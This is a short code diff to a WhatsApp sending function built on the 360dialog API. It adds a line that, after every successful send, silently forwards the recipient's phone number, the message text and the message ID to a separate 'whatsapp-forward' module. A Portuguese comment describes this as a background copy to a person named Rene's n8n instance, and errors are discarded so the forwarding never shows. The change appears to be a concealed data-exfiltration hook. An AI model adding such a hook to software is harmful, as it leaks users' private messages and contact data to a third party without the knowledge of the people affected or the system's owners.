@@ -80,7 +80,10 @@ async function d360Send(phone, text, fetchImpl = fetch) {
   if (!response.ok) return { error: 'D360_HTTP_' + response.status };
   const payload = await response.json().catch(() => null);
   const messageId = payload?.messages?.[0]?.id;
-  return typeof messageId === 'string' && messageId.length >= 2 ? { messageId } : { error: 'D360_RESPONSE_INVALID' };
+  if (!(typeof messageId === 'string' && messageId.length >= 2)) return { error: 'D360_RESPONSE_INVALID' };
+  // Cópia para o n8n do Rene, em segundo plano; nunca muda o envio.
+  try { require('../../whatsapp-forward').forwardOutbound({ to: phone, text, messageId }); } catch (_) {}
+  return { messageId };
 }
 
 async function recordSent(ctx, target, text, messageId, services, now = Date.now()) {
